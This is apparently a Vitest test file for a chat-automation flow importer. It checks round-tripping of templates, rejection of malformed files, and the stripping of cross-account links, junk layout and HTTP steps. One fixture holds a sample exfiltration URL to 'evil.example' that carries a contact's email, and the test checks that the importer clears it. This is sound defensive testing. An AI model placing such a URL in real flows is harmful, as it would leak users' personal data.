import { describe, expect, it } from "vitest";
import { exportFlow, parseFlowImport } from "@/lib/flow-import";
import { FLOW_TEMPLATES } from "@/lib/flow-templates";

describe("flow export / import", () => {
  it("round-trips every template", () => {
    for (const template of FLOW_TEMPLATES) {
      const file = JSON.parse(JSON.stringify(exportFlow(template)));
      const { flow, warnings } = parseFlowImport(file);
      expect(flow.definition.steps).toEqual(template.definition.steps);
      expect(flow.triggerType).toBe(template.triggerType);
      expect(warnings).toEqual([]);
    }
  });

  it("rejects bad files and clears cross-account links", () => {
    expect(() => parseFlowImport({ hello: 1 })).toThrow("not a Relay flow");
    expect(() => parseFlowImport({ relay: "flow", definition: { startStepId: "a", steps: [] } })).toThrow("no steps");
    expect(() => parseFlowImport({ relay: "flow", definition: { startStepId: "x", steps: [{ id: "a", type: "end" }] } })).toThrow("start step");
    expect(() => parseFlowImport({ relay: "flow", definition: { startStepId: "a", steps: [{ id: "a", type: "hack" }] } })).toThrow("Unknown step");
    const { flow, warnings } = parseFlowImport({
      relay: "flow",
      name: "x",
      triggerType: "nope",
      definition: { startStepId: "a", steps: [{ id: "a", type: "start_flow", flowId: "other-account" }] },
    });
    expect(flow.definition.steps[0]).toMatchObject({ flowId: "" });
    expect(flow.triggerType).toBe("keyword_contains");
    expect(warnings).toHaveLength(2);
  });

  it("clears http steps and junk layout from shared files", () => {
    const { flow, warnings } = parseFlowImport({
      relay: "flow",
      name: "x",
      triggerType: "comment",
      definition: {
        startStepId: "a",
        steps: [{ id: "a", type: "http", url: "https://evil.example/?e={{email}}", method: "GET", next: "" }],
        canvas: { nodes: { a: null, b: { x: "1", y: 2 }, c: { x: 10, y: 20 } } },
        trigger: { postIds: ["someone-elses-post"], publicReplies: ["Hi!"], oncePerContact: true },
        extra: "junk",
      },
    });
    expect(flow.definition.steps[0]).toMatchObject({ url: "" });
    expect(warnings[0]).toContain("evil.example");
    expect(flow.definition.canvas).toEqual({ nodes: { c: { x: 10, y: 20 } } });
    expect(flow.definition.trigger).toEqual({ publicReplies: ["Hi!"], oncePerContact: true });
    expect("extra" in flow.definition).toBe(false);
  });
});
